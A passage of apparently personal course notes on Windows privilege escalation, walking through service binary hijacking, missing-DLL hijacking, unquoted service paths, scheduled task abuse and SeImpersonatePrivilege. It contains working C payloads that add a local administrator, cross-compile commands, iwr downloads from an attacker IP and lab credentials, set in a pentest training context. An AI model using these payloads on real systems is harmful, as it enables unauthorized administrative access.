  2188. <li>We can <code>Read and Write</code> and modify the bin, therefore replace it.</li>
  2189. <li>The <code>(I)</code> indicator preceding the perm is missing.</li>
  2190. <li>We know it was set on purpose, not inherited by parent dir.</li>
  2191. <li>Administrators often set Full Access perms when they config a service and they are unsure of perms required.</li>
  2192. <li>Setting Full Access avoids perm problems, but creates a security risk.</li>
  2193. <li>Let&#39;s create a small binary on Kali that we will use to replace the original <code>mysqld.exe</code></li>
  2194. <li>The following C code will:</li>
  2195. <li>Create a user named <code>dave2</code></li>
  2196. <li>Add them to local Administrators group using function <a href="https://man7.org/linux/man-pages/man3/system.3.html">system</a></li>
  2197. <li>The cross-compiled version of this code will serve as our mal bin.</li>
  2198. <li>Save it on Kali as <code>adduser.c</code></li>
  2199. </ul>
  2200. <pre><code>#include &lt;stdlib.h&gt;
  2201. ​
  2202. int main ()
  2203. {
  2204. int i;
  2205. ​
  2206. i = system (&quot;net user dave2 password123! /add&quot;);
  2207. i = system (&quot;net localgroup administrators dave2 /add&quot;);
  2208. ​
  2209. return 0;
  2210. }
  2211. </code></pre>
  2212. <ul>
  2213. <li>Next we&#39;ll cross-compile with mingw-64.<ul>
  2214. <li>64-bit application with <code>x86_64-w64-mingw32-gcc</code></li>
  2215. <li>Arg <code>-o</code> as <code>adduser.exe</code></li>
  2216. </ul>
  2217. </li>
  2218. </ul>
  2219. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/priv-esc]
  2220. └─$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
  2221. </code></pre>
  2222. <ul>
  2223. <li>Once compiled, we can transfer <code>adduser.exe</code> to target and replace the original <code>mysqld.exe</code> bin with our mal copy.</li>
  2224. <li>Start Python3 web server.</li>
  2225. <li>Use <code>iwr</code> on target PS to download the exe.</li>
  2226. <li>Move the og <code>mysqld.exe</code> to our home dir.</li>
  2227. <li>So it can be restored after successful priv esc attempt.</li>
  2228. </ul>
  2229. <pre><code class="language-powershell">PS C:\Users\dave&gt; iwr -uri http://192.168.45.195/adduser.exe -Outfile adduser.exe

  2235. <ul>

  2237. <li>Use <code>net stop</code> to start the service.</li>

  2240. System error 5 has occurred.

  2244. <ul>

  2247. <li>Most services are only managed by Administrators.</li>

  2249. <li>Check the <code>Startup Type</code> with:
  2250. - Cmdlet <code>Get-MimInstance</code><ul>

  2254. </li>

A reboot could lead to unforeseeable problems and should only be issued in direct collaboration with the client&#39;s IT staff. If a system doesn&#39;t boot up after we reboot, this could disrupt our client&#39;s day-to-day business and even cause long-term downtime of the infrastructure. This is especially the case in a situation when there is no current backup available.</em></li>

  2492. <h5>Service DLL Hijacking</h5>
  2493. <p>Replacing the binary of a service is a very effective way to attempt PrivEsc on Win systems. Often our user does not have perms to replace the bins, we need to adapt to a more advanced method of Win service abuse.</p>
  2494. <ul>
  2495. <li><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library">Dynamic Link Libraries (DLL)</a></li>
  2496. <li>Provide functionality to programs or the Win OS.</li>
  2497. <li>Contains code or resources.</li>
  2498. <li>Icon files.</li>
  2499. <li>Other exec files or objects.</li>
  2500. <li>Provide a way for devs to use and integrate existing functionality.</li>
  2501. <li>Win uses DLLs to store func needed by several components.</li>
  2502. <li>Otherwise each component would need the func in their own source.</li>
  2503. <li>On Unix systems these are called <a href="https://docs.oracle.com/cd/E19120-01/open.solaris/819-0690/6n33n7f8u/index.html">Shared Objects</a></li>
  2504. </ul>
  2505. <p>There are several ways to exploit how DLLs work on Win which can be effective for PrivEsc.</p>
  2506. <ul>
  2507. <li>Instead of overwriting the service bin we overwrite the DLL used by it.</li>
  2508. <li>The service may not function as expected because intended DLL func is missing.</li>
  2509. <li>Still lead to code exec of DLL code, allowing us to create a local admin for instance.</li>
  2510. <li>Another method, <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">DLL search order</a></li>
  2511. <li>Search order defined by MS.</li>
  2512. <li>Determines what to inspect first when searching for DLL.</li>
  2513. <li>By default all Win versions have safe DLL search mode enabled.</li>
  2514. <li>Implemented by MS due to the high number of DLL hijacking vectors.
  2515. - Ensure DLLs are more difficult to hijack.
  2516. - The standard search order from MS docs show below.</li>
  2517. </ul>
  2518. <pre><code>1. The directory from which the application loaded.
  2519. 2. The system directory.
  2520. 3. The 16-bit system directory.
  2521. 4. The Windows directory.
  2522. 5. The current directory.
  2523. 6. The directories that are listed in the PATH environment variable.
  2524. </code></pre>
  2525. <ul>
  2526. <li>Win first searched the app dir.</li>
  2527. <li>Interestingly, current dir is at pos 5.</li>
  2528. <li>When safe DLL search mode is disabled, curr dir os pos 2, after app dir.</li>
  2529. <li>A special case of this method is missing DLL.</li>
  2530. <li>The bin attempts to load a DLL that isn&#39;t on the sys.</li>
  2531. <li>Result of flawed install proc.</li>
  2532. <li>Sometimes occurs after update.</li>
  2533. <li>Even with missing DLL app may still work with limited func.</li>
  2534. <li>To exploit this case.</li>
  2535. <li>We can place a mal DLL, named as missing DLL, in a DLL search order path.</li>
  2536. <li>Thus executing mal code when app is started.</li>
  2537. <li>Let&#39;s show how to exploit the missing DLL condition.</li>
  2538. <li>Connect to CLIENTWK220 via RDP.</li>
  2539. <li>User <code>steve</code></li>
  2540. <li>Pass <code>securityIsNotAnOption++++++</code></li>
  2541. </ul>
  2542. <pre><code class="language-powershell">PS C:\Users\steve&gt; Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like &#39;Running&#39;}
  2543. ​
  2544. Name State PathName
  2545. ---- ----- --------
  2546. Apache2.4 Running &quot;C:\xampp\apache\bin\httpd.exe&quot; -k runservice
  2547. Appinfo Running C:\Windows\system32\svchost.exe -k netsvcs -p
  2548. AppXSvc Running C:\Windows\system32\svchost.exe -k wsappx -p
  2549. AudioEndpointBuilder Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
  2550. Audiosrv Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
  2551. BetaService Running C:\Users\steve\Documents\BetaServ.exe
  2552. </code></pre>
  2553. <ul>
  2554. <li>Check our perms for <code>BetaService</code></li>
  2555. </ul>
  2556. <pre><code class="language-powershell">PS C:\Users\steve&gt; icacls .\Documents\BetaServ.exe
  2557. .\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
  2558. BUILTIN\Administrators:(F)
  2559. CLIENTWK220\steve:(RX)
  2560. CLIENTWK220\offsec:(F)
  2561. </code></pre>
  2562. <ul>
  2563. <li>As <code>steve</code> we don&#39;t have the perms to replace the service bin.</li>
  2564. <li>We only have &quot;Read and Execute&quot;.</li>
  2565. <li>To display real-time info about any proc, thread, fs, or registry activity we can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a></li>
  2566. <li>We want to identify the DLLs loaded by <code>BetaService</code> and detect any missing.</li>
  2567. <li>Once we have a list of DLLs used by the service bin we can check their perms.</li>
  2568. <li>Determine if they can be replaced with mal DLL.</li>
  2569. <li>Or if we find a missing DLL we can try to provide one.</li>
  2570. <li>Following the DLL search order.</li>
  2571. <li>We need administrative privs to start Process Monitor and collect data.</li>
  2572. <li>Standard procedure in pentest would be to copy the service bin to a local machine.</li>
  2573. <li>Where we can install the service locally and use Process Monitor with admin privs to list all DLL activity.<ul>
  2574. <li>In this example we will simulate this step by starting Process Monitor as <code>backupadmin</code></li>
  2575. </ul>
  2576. </li>
  2577. <li>Navigate to <code>C:\tools\Procmon\</code></li>
  2578. <li>Double-click <code>Procmon64.exe</code>
  2579. - In the password prompt enter <code>admin123admin123!</code> for <code>backupadmin</code></li>
  2580. <li>Without filters Process Monitor info is very verbose.</li>
  2581. <li>Multiple entries added every seconds.</li>
  2582. <li>We are only interested in events related to the process <code>BetaServ</code> of the target service.</li>
  2583. <li>We can create a filter to only include events relating to it.</li>
  2584. <li>Click on &quot;Filter&quot; &gt; &quot;Filter...&quot;.</li>
  2585. <li>Enter args.
  2586. - Process Name as Column.
  2587. - Is as Relation.
  2588. - BetaServ.exe as Value.
  2589. - Include as Action.
  2590. - Finally click on Add.</li>
  2591. <li>After applying, the list is empty.</li>
  2592. <li>We should restart the service forcing the bin to reload DLLs.</li>
  2593. <li>From PowerShell.</li>
  2594. <li>Enter <code>Restart-Service</code> with <code>BetaService</code> as arg.</li>
  2595. <li>With Process Monitor running in background.</li>
  2596. </ul>
  2597. <pre><code class="language-powershell">PS C:\Users\steve&gt; Restart-Service BetaService
  2598. WARNING: Waiting for service &#39;BetaService (BetaService)&#39; to start...

  2600. <ul>
  2601. <li>We are able to restart the service.</li>
  2602. <li>Process Monitor now shows many events.</li>
  2603. <li>Going town the list.</li>
  2604. <li>We find many CreateFile calls in the Operations column.</li>
  2605. <li>The CreateFile func can be used to create or open a file.</li>
  2606. <li>We see the service bin tries to locate a file called <code>myDLL.dll</code> but fails.
  2607. <img src="assets/static/resources/41dc8d5f1f72178ed78a9cb9a35b0ef2.png" alt="41dc8d5f1f72178ed78a9cb9a35b0ef2.png"></li>
  2608. </ul>
  2609. <pre><code class="language-powershell">PS C:\Users\steve&gt; $env:path
  2610. C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
  2611. </code></pre>
  2612. <ul>
  2613. <li>We see that it followed the paths in env while trying to load but failed each time.</li>
  2614. <li>To leverage this, we can attempt to write a DLL file with this name to a path used by the DLL search order.</li>
  2615. <li>The first call attempts to load from the <code>Documents</code> folder of <code>steve</code></li>
  2616. <li>We have permissions here and can place our mal DLL.</li>
  2617. <li>Then restart service to load it.</li>
  2618. </ul>
  2619. <p>Before creating the DLL let&#39;s briefly review how attaching a DLL works and how it may lead us to code exec. </p>
  2620. <ul>
  2621. <li>Each DLL can have an optional entry point function named <code>DllMain</code></li>
  2622. <li>Executed when process of threads attach the DLL.</li>
  2623. <li>This function generally contains four cases named:</li>
  2624. <li>DLL_PROCESS_ATTACH.</li>
  2625. <li>DLL_THREAD_ATTACH.</li>
  2626. <li>DLL_THREAD_DETACH.</li>
  2627. <li>DLL_PROCESS_DETACH.</li>
  2628. <li>These cases handle DLL loading/unloading by proc/thread.</li>
  2629. <li>Commonly used for initialization or exiting tasks of the DLL.</li>
  2630. <li>If a DLL doesn&#39;t have a DllMain entry point func it only provides resources.</li>
  2631. <li>The following MS example shows us a basic C++ DLL containing the 4 cases.</li>
  2632. <li>The DLL has the entry point func DllMain four cases in switch statement.</li>
  2633. <li>Depending on val of <code>ul_reason_for_call</code> one cases execs.</li>
  2634. <li>All cases just use <code>break</code> in example.</li>
  2635. </ul>
  2636. <pre><code>BOOL APIENTRY DllMain(
  2637. HANDLE hModule,// Handle to DLL module
  2638. DWORD ul_reason_for_call,// Reason for calling function
  2639. LPVOID lpReserved ) // Reserved
  2640. {
  2641. switch ( ul_reason_for_call )
  2642. {
  2643. case DLL_PROCESS_ATTACH: // A process is loading the DLL.
  2644. break;
  2645. case DLL_THREAD_ATTACH: // A process is creating a new thread.
  2646. break;
  2647. case DLL_THREAD_DETACH: // A thread exits normally.
  2648. break;
  2649. case DLL_PROCESS_DETACH: // A process unloads the DLL.
  2650. break;
  2651. }
  2652. return TRUE;
  2653. }
  2654. </code></pre>
  2655. <ul>
  2656. <li>The MS comments state that <code>DLL_PROCESS_ATTACH</code> is used when a proc loads the DLL.</li>
  2657. <li>Since the target service bin proc tries to load a DLL, this is the case we want to use.</li>
  2658. <li>We can reuse the C code from our previous section.</li>
  2659. <li>Add the <code>include</code> statementas well as sys func calls to the C++ DLL code.</li>
  2660. <li>We must also use an <code>include</code> statement for the header file <code>windows.h</code></li>
  2661. <li>Since we use Win specific data types like <code>BOOL</code></li>
  2662. </ul>
  2663. <pre><code>#include &lt;stdlib.h&gt;
  2664. #include &lt;windows.h&gt;
  2665. ​
  2666. BOOL APIENTRY DllMain(
  2667. HANDLE hModule,// Handle to DLL module
  2668. DWORD ul_reason_for_call,// Reason for calling function
  2669. LPVOID lpReserved ) // Reserved
  2670. {
  2671. switch ( ul_reason_for_call )
  2672. {
  2673. case DLL_PROCESS_ATTACH: // A process is loading the DLL.
  2674. int i;
  2675. i = system (&quot;net user dave2 password123! /add&quot;);
  2676. i = system (&quot;net localgroup administrators dave2 /add&quot;);
  2677. break;
  2678. case DLL_THREAD_ATTACH: // A process is creating a new thread.
  2679. break;
  2680. case DLL_THREAD_DETACH: // A thread exits normally.
  2681. break;
  2682. case DLL_PROCESS_DETACH: // A process unloads the DLL.
  2683. break;
  2684. }
  2685. return TRUE;
  2686. }
  2687. </code></pre>
  2688. <ul>
  2689. <li>Next we cross compile with mingw.</li>
  2690. <li>We use the same command as previously but add <code>--shared</code> to specify we are building a DLL.</li>
  2691. </ul>
  2692. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/priv-esc]
  2693. └─$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
  2694. </code></pre>
  2695. <ul>
  2696. <li>Once compiled we can transfer it to CLIENTWK220.</li>
  2697. <li>Before downloading we change dir to <code>Documents</code> on our target sys.</li>
  2698. <li>We also confirm that <code>dave2</code> does not already exist with <code>net user</code></li>
  2699. </ul>
  2700. <pre><code class="language-powershell">PS C:\Users\steve\Documents&gt; iwr -uri http://192.168.45.195/myDLL.dll -Outfile myDLL.dll

  2710. ​

  2721. <ul>

  2741. <ul>

  2744. <h5>Unquoted Service Paths</h5>
  2745. <p>Another PrivEsc vector on Win OS is <a href="https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability">unquoted service paths</a>. This can be used when we have Write perms to a service main dir or sub dir but cannot replace the files directly.</p>
  2746. <p>Each Win service maps an exec file that runs when the service is started. <em>If the path of this file contains one or more spaces and is NOT enclosed in quotes, we may be able to leverage into a PrivEsc attack</em>.</p>
  2747. <p>When a service is started and a proc is created:</p>
  2748. <ul>
  2749. <li>Func called <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a></li>
  2750. <li>The first param of the func is <code>IpApplicationName</code></li>
  2751. <li>Used to specify the name of exec.</li>
  2752. <li>Optionally the path of exec.</li>
  2753. <li>If the string contains spaces and is not enclosed in quotation marks.</li>
  2754. <li>It is not clear to the func where the file name ends and arg begins.</li>
  2755. <li>Allowing various interpretations.</li>
  2756. <li>The func starts interpreting the path from left to right until a space is reached.</li>
  2757. <li>At each space in the path the func uses the preceding part as the file name by adding <code>.exe</code> and the rest as args.
  2758. - Example:</li>
  2759. </ul>
  2760. <pre><code class="language-powershell">C:\Program.exe
  2761. C:\Program Files\My.exe
  2762. C:\Program Files\My Program\My.exe
  2763. C:\Program Files\My Program\My service\service.exe
  2764. </code></pre>
  2765. <ul>
  2766. <li>This shows the order Win tries to interpret the service bin path to locate the exe.</li>
  2767. <li><strong>To exploit this:</strong>.</li>
  2768. <li>We must create a mal exec and place it in a corresponding interpreted path.</li>
  2769. <li>Matching its name to an interpreted name.</li>
  2770. <li>Once the service starts, our our mal exec gets executed with the same privs as the service that starts it.</li>
  2771. <li>Often the <code>LocalSystem</code> account.</li>
  2772. <li>Resulting in successful PrivEsc.</li>
  2773. <li>In the example context our exec could be named <code>Program.exe</code></li>
  2774. <li>Place it in <code>C:\</code></li>
  2775. <li>Or names <code>My.exe</code></li>
  2776. <li>Place it in <code>C:\Program Files\</code> or <code>C:\Program Files\My Program\</code></li>
  2777. <li>The first two options would require perms we are unlikely to have.</li>
  2778. <li>The third options is more likely as it is the software&#39;s main dir.</li>
  2779. <li>If admin or dev set the perms for this dir too open we can place out mal bin there.</li>
  2780. </ul>
  2781. <p>Now that we have a basic understanding of this vuln, let&#39;s use it in an example.</p>
  2782. <ul>
  2783. <li>Connect to CLIENTWK220.</li>
  2784. <li>User <code>steve</code></li>
  2785. <li>Password <code>securityIsNotAnOption++++++</code></li>
  2786. <li>Via RDP.</li>
  2787. <li>Open PowerShell and enum running/stopped services.</li>
  2788. </ul>
  2789. <pre><code class="language-powershell">PS C:\Users\steve&gt; Get-CimInstance -CLassName win32_service | Select Name,State,PathName
  2790. ​
  2791. Name State PathName
  2792. ---- ----- --------
  2793. AJRouter Stopped C:\Windows\system32\svchost.exe -k LocalServi...
  2794. ...
  2795. GammaService Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
  2796. </code></pre>
  2797. <ul>
  2798. <li>We see a service named GammaService.</li>
  2799. <li>With an unquoted sevice bin path containing multiple spaces.</li>
  2800. <li>There is a potential vector.</li>
  2801. <li>A more effective way to identify spaces/missing quotes is with <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic">WMI command-line (WMIC)</a></li>
  2802. <li>To obtain service info <code>service</code></li>
  2803. <li>The verb <code>get</code></li>
  2804. <li>Arg <code>name</code></li>
  2805. <li>Arg <code>pathname</code></li>
  2806. <li>Pipe output to <code>findstr</code></li>
  2807. <li>Case insensitive searching <code>/i</code></li>
  2808. <li>Print only lines that don&#39;t match <code>/v</code></li>
  2809. <li>Arg <code>C:\Windows\</code></li>
  2810. <li>Only show service with bin paths outside of Win dir.</li>
  2811. <li>Pipe output to another <code>findstr</code></li>
  2812. <li>Arg <code>&quot;&quot;&quot;</code></li>
  2813. <li>To print only matches without quotes.</li>
  2814. <li>Use <code>cmd.exe</code> instead of PowerShell to avoid escaping issue of the quote in the second <code>findstr</code> command.</li>
  2815. <li>Alternatively we could use <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2">Select-String</a> in PowerShell.</li>
  2816. </ul>

  2999. <li>Default behavior is to create a new local user <code>john</code> with password <code>Password123!</code></li>

  3001. </ul>

  3034. <h4>16.3 Abusing Other Windows Components</h4>
  3035. <ul>
  3036. <li>Leverage Scheduled Tasks to elevate our privileges.</li>
  3037. <li>Understand the different types of exploits leading to privilege escalation.</li>
  3038. <li>Abuse privileges to execute code as privileged user accounts.</li>
  3039. </ul>
  3040. <h5>Scheduled Tasks</h5>
  3041. <p>Win uses Task Scheduler to automate various tasks.</p>
  3042. <ul>
  3043. <li>Clean-up activities.</li>
  3044. <li>Update management.</li>
  3045. </ul>
  3046. <p>Win terminology is <code>Schedule Tasks</code> or <code>Tasks</code> which are defined by one or more triggers. A trigger is used as a condition, when met causing one or more actions to exec. </p>
  3047. <ul>
  3048. <li>Example; a <code>trigger</code> can be set.</li>
  3049. <li>For a specific time and date.</li>
  3050. <li>At startup.</li>
  3051. <li>At log on.</li>
  3052. <li>On a Win event.</li>
  3053. </ul>
  3054. <p>There are 3 vital pieces of info for identifying possible PrivEsc vectors from a scheduled task.</p>
  3055. <ul>
  3056. <li>Which user account/Principal does the task get exec?</li>
  3057. <li>What triggers are specified for the task?</li>
  3058. <li>What actions are executed for the task when one or more triggers are met?</li>
  3059. </ul>
  3060. <p><strong>User Account/Principal</strong>
  3061. The first question helps us determine if we can abuse the task to lead to PrivEsc.</p>
  3062. <ul>
  3063. <li>If the task is exec in context of current user.</li>
  3064. <li>We cannot PrivEsc.</li>
  3065. <li>If the task runs as NT AUTHORITY\SYSTEM or an admin user.</li>
  3066. <li>A successful attack could lead to PrivEsc.</li>
  3067. </ul>
  3068. <p><strong>Specified Triggers</strong>
  3069. The second question tells us if the trigger was met in the past.</p>
  3070. <ul>
  3071. <li>If the trigger was met.</li>
  3072. <li>it will not run again, meaning it is not a viable target.</li>
  3073. <li>if the task would run in the future beyond the duration of the engagement.</li>
  3074. <li>we should search for another vector.</li>
  3075. <li>we should however note this in our findings.</li>
  3076. </ul>
  3077. <p><strong>Actions Executed When Triggers Met</strong>
  3078. The answer to this determines how we can potentially perform a PrivEsc attack. In the majority of cases we can leverage familiar tactics:</p>
  3079. <ul>
  3080. <li>Replacing the binary.</li>
  3081. <li>Placing a missing DLL.
  3082. There are no service binaries with scheduled tasks, we do have programs and scripts specified by the actions.</li>
  3083. </ul>
  3084. <p>In this example we will attempt PrivEsc by replacing a binary specified by an action.</p>
  3085. <ul>
  3086. <li>Connect to CLIENTWK220 via RDP.</li>
  3087. <li>User <code>steve</code></li>
  3088. <li>Password <code>securityIsNotAnOption++++++</code></li>
  3089. <li>Start a PowerShell session.</li>
  3090. <li>We can view scheduled tasks on Win with <a href="https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2022-ps">Get-ScheduledTask</a>
  3091. - Cmdlet <code>Get-ScheduledTask</code></li>
  3092. <li>Or <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query">schtasks /query</a>
  3093. - Cmd <code>schtasks /query</code><ul>
  3094. <li>Arg <code>/fo LIST</code></li>
  3095. <li>Arg <code>/v</code></li>
  3096. <li>To display all properties of task.</li>
  3097. </ul>
  3098. </li>
  3099. <li>Once executed we get verbose output of all scheduled tasks.</li>
  3100. <li>We are interested in information that answers one of the 3 questions.</li>
  3101. <li>Author.</li>
  3102. <li>TaskName.</li>
  3103. <li>Task To Run.</li>
  3104. <li>Run As User.</li>
  3105. <li>Next Run Time.</li>
  3106. <li>Large amount of output, pipe to more <code>| more</code></li>
  3107. </ul>
  3108. <pre><code class="language-powershell">PS C:\Users\steve&gt; schtasks /query /fo LIST /v | more
  3109. ...
  3110. Folder: \Microsoft
  3111. HostName: CLIENTWK220
  3112. TaskName: \Microsoft\CacheCleanup
  3113. Next Run Time: 7/11/2022 2:47:21 AM
  3114. Status: Ready
  3115. Logon Mode: Interactive/Background
  3116. Last Run Time: 7/11/2022 2:46:22 AM
  3117. Last Result: 0
  3118. Author: CLIENTWK220\daveadmin
  3119. Task To Run: C:\Users\steve\Pictures\BackendCacheCleanup.exe
  3120. Start In: C:\Users\steve\Pictures
  3121. Comment: N/A
  3122. Scheduled Task State: Enabled
  3123. Idle Time: Disabled
  3124. Power Management: Stop On Battery Mode
  3125. Run As User: daveadmin
  3126. Delete Task If Not Rescheduled: Disabled
  3127. Stop Task If Runs X Hours and X Mins: Disabled
  3128. Schedule: Scheduling data is not available in this format.
  3129. Schedule Type: One Time Only, Minute
  3130. Start Time: 7:37:21 AM
  3131. Start Date: 7/4/2022
  3132. ...
  3133. </code></pre>
  3134. <ul>
  3135. <li>We find a task created by <code>daveadmin</code></li>
  3136. <li>The specified action exec is <code>BackendCacheCleanup.exe</code></li>
  3137. <li>In the <code>Pictures</code> dir of user <code>steve</code></li>
  3138. <li>The times from <code>Last Run Time</code> and <code>Next Run Time</code> indicate task runs every minute.</li>
  3139. <li>Task runs as <code>daveadmin</code></li>
  3140. <li>Since the exec is in the home <code>Pictures</code> dir of <code>steve</code> we should have perms.</li>
  3141. <li>Check file perms with <code>icacls</code></li>
  3142. </ul>
  3143. <pre><code class="language-powershell">PS C:\Users\steve&gt; icacls .\Pictures\BackendCacheCleanup.exe
  3144. .\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
  3145. BUILTIN\Administrators:(I)(F)
  3146. CLIENTWK220\steve:(I)(F)
  3147. CLIENTWK220\offsec:(I)(F)
  3148. </code></pre>
  3149. <ul>
  3150. <li>As expected we have full permissions <code>(F)</code></li>
  3151. <li>We can use a mal binary, like <code>adduser.exe</code>, to replace the exe specified in the action of the scheduled task.</li>
  3152. <li>We can now transfer our mal via <code>iwr</code> and make a backup of original <code>BackendCacheCleanup.exe</code></li>
  3153. </ul>
  3154. <pre><code class="language-powershell">PS C:\Users\steve&gt; iwr -uri http://192.168.45.195/adduser.exe -Outfile adduser.exe
  3155. PS C:\Users\steve&gt; copy .\Pictures\BackendCacheCleanup.exe .\BackendCacheCleanup.exe
  3156. PS C:\Users\steve&gt; ls .\BackendCacheCleanup.exe

  3158. ​

  3161. ​

  3163. ---- ------------- ------ ----
  3164. -a---- 7/4/2022 7:40 AM 4096 BackendCacheCleanup.exe
  3165. ​
  3166. ​
  3167. PS C:\Users\steve&gt; move .\Pictures\BackendCacheCleanup.exe .
  3168. PS C:\Users\steve&gt; copy .\adduser.exe .\Pictures\BackendCacheCleanup.exe
  3169. </code></pre>
  3170. <ul>
  3171. <li>Once the task executes again <code>dave2</code> should be created as local Administrator group memeber.</li>
  3172. <li>After one minute we check if our PrivEsc attack is successful .</li>
  3173. </ul>
  3174. <pre><code class="language-powershell">PS C:\Users\steve&gt; net user
  3175. ​

  3180. dave2 daveadmin DefaultAccount

  3199. PS C:\Users\steve&gt; rm .\Pictures\BackendCacheCleanup.exe
  3200. PS C:\Users\steve&gt; copy .\BackendCacheCleanup.exe .\Pictures\

  3202. <ul>
  3203. <li>We see that we have successfully leveraged scheduled tasks for PrivEsc.</li>
  3204. </ul>
  3205. <p>This vector is similar to &quot;Service Binary Hijacking&quot; vector, but it focuses on the scheduled task instead of Win services.</p>
  3206. <h5>Using Exploits</h5>
  3207. <p>We have seen how to leverage sensitive info and abuse Win components to achieve PrivEsc, we&#39;ll now explore three different exploits that can lead to PrivEsc and show an example of one.</p>
  3208. <ul>
  3209. <li><ol>
  3210. <li>application-based vulnerabilities.</li>
  3211. </ol>
  3212. </li>
  3213. <li><p>Apps installed on Win systems may contain vulns.</p>
  3214. </li>
  3215. <li><p>As learned in &quot;Locating Public Exploits&quot;.</p>
  3216. </li>
  3217. <li><p>If apps run with administrative perms we can exploit a vuln that leads to code exec.</p>
  3218. </li>
  3219. <li><p>Which would successfully achieve PrivEsc.</p>
  3220. </li>
  3221. <li><ol start="2">
  3222. <li>exploit vulns in <a href="https://en.wikipedia.org/wiki/Architecture_of_Windows_NT">Windows Kernel</a></li>
  3223. </ol>
  3224. </li>
  3225. <li><p>The vulns and research are very advanced.</p>
  3226. </li>
  3227. <li><p>Require extensive knowledge of the Win OS.</p>
  3228. </li>
  3229. <li><p>For our purpose, it is enough to know they can be used to achieve PrivEsc.</p>
  3230. </li>
  3231. <li><p>BEFORE using these exploits.</p>
  3232. </li>
  3233. <li><p>Consider they can easily crash a system.</p>
  3234. </li>
  3235. <li><p>Depending on engagement this may not be allowed.</p>
  3236. </li>
  3237. <li><p>Always have a clear understanding of assessment rules.</p>
  3238. </li>
  3239. <li><ol start="3">
  3240. <li>Win priv abuse.</li>
  3241. </ol>
  3242. </li>
  3243. <li><p>Non-priv users with key assigned privs can abuse to perform PrivEsc.
  3244. - <code>SeImpersonatePrivilege</code></p>
  3245. <ul>
  3246. <li>Possible to leverage a token with a different security context.</li>
  3247. <li>Perform ops in the context of another account.</li>
  3248. </ul>
  3249. </li>
  3250. <li><p>Assigned by default to:</p>
  3251. </li>
  3252. <li><p>Local Administrators.</p>
  3253. </li>
  3254. <li><p>LOCAL SERVICE.</p>
  3255. </li>
  3256. <li><p>NETWORK SERVICE.</p>
  3257. </li>
  3258. <li><p>SERVICE accounts.</p>
  3259. </li>
  3260. <li><p>MS implemented to prevent.</p>
  3261. </li>
  3262. <li><p>Unauthed user from creating a service or server app.</p>
  3263. </li>
  3264. <li><p>Server apps impersonating clients connecting to it.</p>
  3265. <ul>
  3266. <li>Example:<ul>
  3267. <li><a href="https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page">Remote Procedure Call (RPC)</a></li>
  3268. <li><a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipes</a></li>
  3269. </ul>
  3270. </li>
  3271. </ul>
  3272. </li>
  3273. </ul>
  3274. <p><em>Other privileges that may lead to privilege escalation are SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug. In this section, we&#39;ll closely inspect privilege escalation vectors in the context of SeImpersonatePrivilege.</em></p>
  3275. <ul>
  3276. <li>IRL it is rare to find standard users with this priv.</li>
  3277. <li>However, we often find it when exploiting vulns in ISS we server apps.</li>
  3278. <li>ISS will run as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity.</li>
  3279. <li>All having <code>SeImpersonatePrivilege</code> assigned.</li>
  3280. <li>Also applies to other Win service.</li>
  3281. </ul>
  3282. <p>Let&#39;s briefly discuss named pipes and how to leverage SeImpersonatePrinilege to impersonate a priv user account!</p>
  3283. <ul>
  3284. <li><code>named pipe</code> are one method for local or remote <a href="https://en.wikipedia.org/wiki/Inter-process_communication">Inter-Process Communication (IPC)</a></li>
  3285. <li>Offer func of two unrelated procs sharing/transfering data.</li>
  3286. <li>A named pipe server can create a named pipe that a named pipe client can connect to via specified name.</li>
  3287. <li>Server/client do not need to be on the same sys.</li>
  3288. <li>Once a client connects to a named pipe.</li>
  3289. <li>Server can leverage SeImpersonatePrivilege to impersonate this client.</li>
  3290. <li>After capturing auth from the connection proc.</li>
  3291. <li>To abuse, we need to coerce a priv proc to connect to a controlled named pipe.</li>
  3292. <li>We can them impersonate the account connecting to the named pipe.</li>
  3293. <li>Performing actions in its security context.</li>
  3294. </ul>
  3295. <p><strong>Example</strong></p>
  3296. <ul>
  3297. <li><p>We will use <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a></p>
  3298. </li>
  3299. <li><p>Created by <em>itm4n</em>.</p>
  3300. </li>
  3301. <li><p>Implements variation of <a href="https://adsecurity.org/?p=4056">printer bug</a></p>
  3302. </li>
  3303. <li><p>Coerce NT AUTHORITY\SYSTEM into connecting to controlled named pipe.</p>
  3304. </li>
  3305. <li><p>We can use this:</p>
  3306. </li>
  3307. <li><p>When we have code exec as a user with <code>SeImpersonatePrivilege</code></p>
  3308. </li>
  3309. <li><p>To exec commands or obtain shell as NT AUTHORITY\SYSTEM.
  3310. <em>PEN-300 covers the printer bug in detail. The course provides a technical in-depth explanation of how it works and walks through developing a custom C# program to exploit it.</em></p>
  3311. </li>
  3312. <li><p>Connect to our bind shell.</p>
  3313. </li>
  3314. <li><p>Port <code>4444</code></p>
  3315. </li>
